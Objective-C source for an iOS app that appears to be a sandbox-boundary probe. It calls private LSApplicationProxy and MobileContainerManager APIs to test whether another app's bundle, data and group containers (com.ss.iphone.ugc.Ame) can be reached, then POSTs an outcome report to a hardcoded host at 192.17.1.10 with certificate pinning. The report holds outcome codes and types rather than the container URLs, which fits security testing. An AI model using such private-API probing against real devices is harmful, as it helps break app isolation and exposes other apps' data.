#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <dlfcn.h>
#include <string.h>
#import <Security/Security.h>

// Contract: pinned LS readonly object-return metadata getters; no target URL use.
// Outcomes: 0 skipped, 1 receiver unavailable, 2 selector unavailable,
// 3 incompatible signature, 4 exception, 5 returned (including nil).
static void SetResult(NSMutableDictionary *r, NSString *p, NSUInteger outcome,
                      BOOL signature, id value, Class expected) {
 NSUInteger type = !value ? 0 : [value isKindOfClass:NSURL.class] ? 1 :
   [value isKindOfClass:NSDictionary.class] ? 2 : [value isKindOfClass:NSString.class] ? 3 : 4;
 r[[p stringByAppendingString:@"_outcome"]]=@(outcome);
 r[[p stringByAppendingString:@"_signature_valid"]]=@(signature);
 r[[p stringByAppendingString:@"_value_present"]]=@((BOOL)(value!=nil));
 r[[p stringByAppendingString:@"_value_type"]]=@(type);
 r[[p stringByAppendingString:@"_expected_type"]]=@((BOOL)(value && expected && [value isKindOfClass:expected]));
 r[[p stringByAppendingString:@"_error_api_supported"]]=@NO;
}
static BOOL Encoding(const char *t,char expected) {
 while (*t && strchr("rnNoORV",*t)) t++;
 return t[0]==expected && t[1]=='\0';
}
static id Query(id receiver, NSString *name, id argument, BOOL hasArgument,
                Class expected, NSString *prefix, NSMutableDictionary *r) {
 BOOL signature=NO;
 if(!receiver){SetResult(r,prefix,1,NO,nil,expected);return nil;}
 @try {
  SEL selector=NSSelectorFromString(name);
  if(![receiver respondsToSelector:selector]){SetResult(r,prefix,2,NO,nil,expected);return nil;}
  NSMethodSignature *s=[receiver methodSignatureForSelector:selector];
  signature=s && s.numberOfArguments==(hasArgument?3:2) &&
    Encoding(s.methodReturnType,'@') && s.methodReturnLength==sizeof(id) &&
    Encoding([s getArgumentTypeAtIndex:0],'@') && Encoding([s getArgumentTypeAtIndex:1],':') &&
    (!hasArgument || Encoding([s getArgumentTypeAtIndex:2],'@'));
  if(!signature){SetResult(r,prefix,3,NO,nil,expected);return nil;}
  NSInvocation *inv=[NSInvocation invocationWithMethodSignature:s];
  inv.target=receiver;inv.selector=selector;
  if(hasArgument){id arg=argument;[inv setArgument:&arg atIndex:2];}
  [inv invoke];__unsafe_unretained id raw=nil;[inv getReturnValue:&raw];id value=raw;
  SetResult(r,prefix,5,YES,value,expected);return value;
 } @catch(NSException *exception){SetResult(r,prefix,4,signature,nil,expected);return nil;}
}

static const char *Unqualified(const char *t) { while(*t && strchr("rnNoORV",*t))t++;return t; }
static BOOL ExactType(const char *t,const char *want) {return strcmp(Unqualified(t),want)==0;}
static BOOL PointerType(const char *t,const char *want) {t=Unqualified(t);return *t=='^' && ExactType(t+1,want);}
static void MCM(NSMutableDictionary *r) {
 r[@"mcm_framework_loaded"]=@((BOOL)(dlopen("/System/Library/PrivateFrameworks/MobileContainerManager.framework/MobileContainerManager",RTLD_LAZY|RTLD_LOCAL)!=NULL));
 Class cls=NSClassFromString(@"MCMAppDataContainer");Class parent=NSClassFromString(@"MCMContainer");
 BOOL signature=NO;
 r[@"mcm_class_valid"]=@((BOOL)(cls && parent && [cls isSubclassOfClass:parent]));
 if(![r[@"mcm_class_valid"] boolValue]){r[@"mcm_outcome"]=@1;return;}
 @try {
  SEL sel=NSSelectorFromString(@"containerWithIdentifier:createIfNecessary:existed:error:");
  if(![cls respondsToSelector:sel]){r[@"mcm_outcome"]=@2;return;}
  NSMethodSignature *s=[cls methodSignatureForSelector:sel];
  signature=s && s.numberOfArguments==6 && ExactType(s.methodReturnType,@encode(id)) && s.methodReturnLength==sizeof(id) &&
   ExactType([s getArgumentTypeAtIndex:0],@encode(id)) && ExactType([s getArgumentTypeAtIndex:1],@encode(SEL)) &&
   ExactType([s getArgumentTypeAtIndex:2],@encode(id)) && ExactType([s getArgumentTypeAtIndex:3],@encode(BOOL)) &&
   PointerType([s getArgumentTypeAtIndex:4],@encode(BOOL)) && PointerType([s getArgumentTypeAtIndex:5],@encode(id));
  if(signature){NSUInteger size=0;NSGetSizeAndAlignment([s getArgumentTypeAtIndex:3],&size,NULL);signature=size==sizeof(BOOL);}
  r[@"mcm_signature_valid"]=@(signature);
  if(!signature){r[@"mcm_outcome"]=@3;return;}
  NSInvocation *inv=[NSInvocation invocationWithMethodSignature:s];inv.target=cls;inv.selector=sel;
  id identifier=@"com.ss.iphone.ugc.Ame";BOOL create=NO;BOOL existed=NO;BOOL *existedPtr=&existed;
  __autoreleasing id error=nil;id __autoreleasing *errorPtr=&error;
  [inv setArgument:&identifier atIndex:2];[inv setArgument:&create atIndex:3];[inv setArgument:&existedPtr atIndex:4];[inv setArgument:&errorPtr atIndex:5];
  [inv invoke];__unsafe_unretained id raw=nil;[inv getReturnValue:&raw];id value=raw;
  r[@"mcm_outcome"]=@5;r[@"mcm_existed"]=@(existed);r[@"mcm_value_present"]=@((BOOL)(value!=nil));
  r[@"mcm_value_expected_type"]=@((BOOL)(value && [value isKindOfClass:cls]));
  r[@"mcm_value_type"]=@(!value?0:([value isKindOfClass:cls]?1:2));
  r[@"mcm_error_present"]=@((BOOL)(error!=nil));BOOL validError=[error isKindOfClass:NSError.class];r[@"mcm_error_is_nserror"]=@(validError);
  if(validError){NSError *e=error;r[@"mcm_error_code"]=@(e.code);r[@"mcm_error_posix"]=@((BOOL)[e.domain isEqualToString:NSPOSIXErrorDomain]);r[@"mcm_error_cocoa"]=@((BOOL)[e.domain isEqualToString:NSCocoaErrorDomain]);r[@"mcm_error_mcm"]=@((BOOL)[e.domain isEqualToString:@"MCMErrorDomain"]);r[@"mcm_error_other"]=@((BOOL)(![r[@"mcm_error_posix"] boolValue] && ![r[@"mcm_error_cocoa"] boolValue] && ![r[@"mcm_error_mcm"] boolValue]));}
 } @catch(NSException *exception){r[@"mcm_outcome"]=@4;}
}

static NSDictionary *Collect(void) {
 NSMutableDictionary *r=[@{@"schema":@3,@"receiver_available":@YES,@"framework_loaded":@NO,
  @"proxy_type_valid":@NO,@"identifier_match":@NO} mutableCopy];
 for(NSString *p in @[@"lookup",@"identifier",@"bundle",@"data",@"groups"])SetResult(r,p,0,NO,nil,Nil);
 for(NSString *k in @[@"mcm_framework_loaded",@"mcm_class_valid",@"mcm_signature_valid",@"mcm_existed",@"mcm_value_present",@"mcm_value_expected_type",@"mcm_error_present",@"mcm_error_is_nserror",@"mcm_error_posix",@"mcm_error_cocoa",@"mcm_error_mcm",@"mcm_error_other"])r[k]=@NO;
 r[@"mcm_outcome"]=@0;r[@"mcm_value_type"]=@0;r[@"mcm_error_code"]=@0;
 r[@"framework_loaded"]=@((BOOL)(dlopen("/System/Library/Frameworks/MobileCoreServices.framework/MobileCoreServices",RTLD_LAZY|RTLD_LOCAL)!=NULL));
 Class cls=NSClassFromString(@"LSApplicationProxy");
 id proxy=Query(cls,@"applicationProxyForIdentifier:",@"com.ss.iphone.ugc.Ame",YES,cls,@"lookup",r);
 BOOL valid=proxy && cls && [proxy isKindOfClass:cls];r[@"proxy_type_valid"]=@(valid);
 if(!valid){MCM(r);return r;}
 id identifier=Query(proxy,@"applicationIdentifier",nil,NO,NSString.class,@"identifier",r);
 BOOL match=[identifier isKindOfClass:NSString.class] && [identifier isEqualToString:@"com.ss.iphone.ugc.Ame"];
 r[@"identifier_match"]=@(match);if(!match){MCM(r);return r;}
 Query(proxy,@"bundleURL",nil,NO,NSURL.class,@"bundle",r);
 Query(proxy,@"dataContainerURL",nil,NO,NSURL.class,@"data",r);
 Query(proxy,@"groupContainerURLs",nil,NO,NSDictionary.class,@"groups",r);
 MCM(r);
 return r;
}
@interface AppDelegate:UIResponder<UIApplicationDelegate,NSURLSessionTaskDelegate>
@property(nonatomic,strong)UIWindow *window;
@property(nonatomic,strong)NSURLSession *session;
@end
@implementation AppDelegate

-(void)URLSession:(NSURLSession*)session didReceiveChallenge:(NSURLAuthenticationChallenge*)challenge completionHandler:(void(^)(NSURLSessionAuthChallengeDisposition,NSURLCredential*))completionHandler {
 NSURLProtectionSpace *space=challenge.protectionSpace;
 if(session!=self.session || ![space.authenticationMethod isEqualToString:NSURLAuthenticationMethodServerTrust] || ![space.host isEqualToString:@"192.17.1.10"] || space.port!=59701 || ![space.protocol isEqualToString:@"https"] || !space.serverTrust){completionHandler(NSURLSessionAuthChallengeCancelAuthenticationChallenge,nil);return;}
 SecTrustRef trust=space.serverTrust;SecCertificateRef leaf=SecTrustGetCertificateAtIndex(trust,0);
 NSData *actual=leaf?CFBridgingRelease(SecCertificateCopyData(leaf)):nil;
 NSData *pinned=[[NSData alloc]initWithBase64EncodedString:@"MIIC6TCCAdGgAwIBAgIUBjRAycMk3PbXKL1EJA1AW3lXzHcwDQYJKoZIhvcNAQELBQAwJDEiMCAGA1UEAwwZRElENjAzIGVwaGVtZXJhbCByZWNlaXZlcjAeFw0yNjA5MDkxODA4NDhaFw0yNjA5MDkxOTEzNDhaMCQxIjAgBgNVBAMMGURJRDYwMyBlcGhlbWVyYWwgcmVjZWl2ZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDAASAP3hTcvv1v8oXS02LdMWqAk/WSeKZqgEBrx0uAfND3IyjPyu8opWdcKjgabzTC9k7NFJjfVLGlxhn7Hyt78A10SGvzujJ9dWqg+dV+JDLjCeXUx00Xs7UieW01g1NilcZjG4B/xsPWGxFS820hPt4SqhihKRc4OVBtUmSZg4lm8v8irsu/5XoQiFM1KBYFE+4yWg+LEiBJXmCO6JNeU+WNqQTHkZXyomodHbKS0T23ijZZyKAt17OZlRzb9j76ZohHohzqwpP4g2oAFcDEG3W1DSCTQgde4hMHcGIqmfMqpU/PQ/cBnDT9XvTm0/8I5qRrKH5nigEtUiCzmvRTAgMBAAGjEzARMA8GA1UdEQQIMAaHBMARAQowDQYJKoZIhvcNAQELBQADggEBAFIQJw+ids70vY+E2mVW/UOh6Ja6T1FNqgAoqfSfAtCm5XoAuz3ATvCkkON8U62CdcN3W5/Afbz8gmbsCNPUHxw6qaUAmxaFZWjiz18JugB6P6D9Goz6ytZgpdedPOsqVpLkJsL5GxIS3uSTTTigcDU4KDyyV8J6o9VQkwBODceLL6N6R+PLBo8U6D/ic0gOarrdRa/l+WYUFFGv/3KKdiPeuYmHjNb7uQvSQIJzCcE7xyCffU8K0JcO5BhE4XmJOqmvGp7u5tOfiJImiSKqd/uMAKg08Tm95GmVzXq0VvWoejOseehw4mYFYGcXNktG68qVQOcegjGTRAW4XJ64eKA=" options:0];
 if(!actual || ![actual isEqualToData:pinned]){completionHandler(NSURLSessionAuthChallengeCancelAuthenticationChallenge,nil);return;}
 // Trust changes apply only to this challenge's SecTrust, never system trust.
 SecPolicyRef policy=SecPolicyCreateSSL(true,CFSTR("192.17.1.10"));SecTrustSetPolicies(trust,policy);CFRelease(policy);
 SecTrustSetAnchorCertificates(trust,(__bridge CFArrayRef)@[(__bridge id)leaf]);SecTrustSetAnchorCertificatesOnly(trust,true);
 if(!SecTrustEvaluateWithError(trust,NULL)){completionHandler(NSURLSessionAuthChallengeCancelAuthenticationChallenge,nil);return;}
 completionHandler(NSURLSessionAuthChallengeUseCredential,[NSURLCredential credentialForTrust:trust]);
}

-(void)URLSession:(NSURLSession*)session task:(NSURLSessionTask*)task willPerformHTTPRedirection:(NSHTTPURLResponse*)response newRequest:(NSURLRequest*)request completionHandler:(void(^)(NSURLRequest*))completionHandler {
 completionHandler(nil); // Never forward report to redirects.
}
-(BOOL)application:(UIApplication*)application didFinishLaunchingWithOptions:(NSDictionary*)options {
 self.window=[[UIWindow alloc]initWithFrame:UIScreen.mainScreen.bounds];UIViewController *vc=[UIViewController new];self.window.rootViewController=vc;[self.window makeKeyAndVisible];
 UITextView *text=[[UITextView alloc]initWithFrame:vc.view.bounds];text.autoresizingMask=UIViewAutoresizingFlexibleWidth|UIViewAutoresizingFlexibleHeight;text.editable=NO;[vc.view addSubview:text];
 NSDictionary *report=Collect();NSData *data=[NSJSONSerialization dataWithJSONObject:report options:0 error:nil];
 text.text=[[NSString alloc]initWithData:data encoding:NSUTF8StringEncoding];
 if(!data || data.length>16384)return YES;
 NSURL *endpoint=[NSURL URLWithString:@"https://192.17.1.10:59701/did603/f94de95617e773097ee572267e457658"];
 NSMutableURLRequest *req=[NSMutableURLRequest requestWithURL:endpoint cachePolicy:NSURLRequestReloadIgnoringLocalCacheData timeoutInterval:15];
 req.HTTPMethod=@"POST";req.HTTPBody=data;[req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
 NSURLSessionConfiguration *config=[NSURLSessionConfiguration ephemeralSessionConfiguration];
 config.HTTPCookieStorage=nil;config.HTTPShouldSetCookies=NO;config.URLCredentialStorage=nil;config.URLCache=nil;
 config.connectionProxyDictionary=@{};config.timeoutIntervalForRequest=15;config.timeoutIntervalForResource=20;
 self.session=[NSURLSession sessionWithConfiguration:config delegate:self delegateQueue:nil];
 [[self.session dataTaskWithRequest:req completionHandler:^(NSData *body,NSURLResponse *response,NSError *error){
  NSInteger status=[response isKindOfClass:NSHTTPURLResponse.class]?[(NSHTTPURLResponse*)response statusCode]:0;
  dispatch_async(dispatch_get_main_queue(),^{text.text=[text.text stringByAppendingFormat:@"\nCallback HTTP: %ld; transport error: %ld",(long)status,(long)error.code];});
  [self.session finishTasksAndInvalidate];
 }] resume];return YES;
}
@end
int main(int argc,char **argv){@autoreleasepool{return UIApplicationMain(argc,argv,nil,NSStringFromClass(AppDelegate.class));}}
